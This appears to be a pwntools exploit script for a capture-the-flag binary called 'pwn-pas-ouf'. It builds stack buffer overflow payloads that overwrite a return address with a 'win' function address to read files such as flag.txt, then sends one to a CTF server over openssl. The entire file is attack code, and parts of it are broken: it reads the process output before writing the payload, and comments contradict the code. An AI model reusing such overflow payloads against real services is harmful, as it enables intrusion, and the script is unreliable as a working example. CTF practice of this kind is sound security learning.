#!/usr/bin/python3
from pwn import *
import socket
import ssl
import subprocess

elf = context.binary = ELF("pwn-pas-ouf")

# offset 280

offset = b"A"*280
win = 0x4011a0

# openssl s_client -quiet -verify_quiet -connect main-5000-pwn-pas-ouf-c50f319ee6be36e6.ctf.4ts.fr:52525
# readme.md
payload = p64(0)*16 + b"readme.md" + p64(0)*17 + b"\x00"*7 + p64(win) + b"\n"

# flag.txt
payload1 = p64(0)*16 + b"flag.txt" + p64(0)*18 + p64(win) + b"\n"

# Readme.md
payload2 = b"\x00"*128 + b"\x64\x6d\x2e\x65\x6d\x64\x61\x65\x72" + b"\x00"*143 + b"\xa0\x11\x40\x00\x00\x00\x00\x00" + b"\n"
print(payload2)

# flag.txt
payload3 = "\x00"*128 + "\x74\x78\x74\x2e\x67\x61\x6c\x66" + "\x00"*144 + "\xa0\x11\x40\x00\x00\x00\x00\x00" + "\n"

# flag
payload4 = "\x00"*128 + "\x67\x61\x6c\x66" + "\x00"*148 + "\xa0\x11\x40\x00\x00\x00\x00\x00" + "\n"
def interact_with_server():
    # Define the target host and port
    host = "main-5000-pwn-pas-ouf-c50f319ee6be36e6.ctf.4ts.fr"
    port = 52525
    
    # Form the OpenSSL command with the specified options
    command = [
        "openssl", "s_client", 
        "-quiet",              # Suppress unnecessary output
        "-verify_quiet",       # Suppress verification-related messages
        "-connect", f"{host}:{port}"  # Specify the target server and port
    ]
    
    # Use subprocess.Popen to start the OpenSSL command
    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    # Print the server's response
    # Capture the output from jj
    stdout, stderr = process.communicate()  # Get both stdout and stderr
    #print("Server Response:\n", stdout)

    # Send some data (e.g., a message or request to the server) as bytes
    data_to_send = b"Your message or data here\n"  # Create byte string
    process.stdin.write(payload4)  # Decode the byte string to str before writing
    process.stdin.flush()  # Ensure data is sent

    
    # Print the server's response
    print("Server Response:\n", stdout)
   
    # Check if there was any error (OpenSSL might print to stderr)
    if stderr:
        print("Errors:\n", stderr)

if __name__ == "__main__":
    interact_with_server()
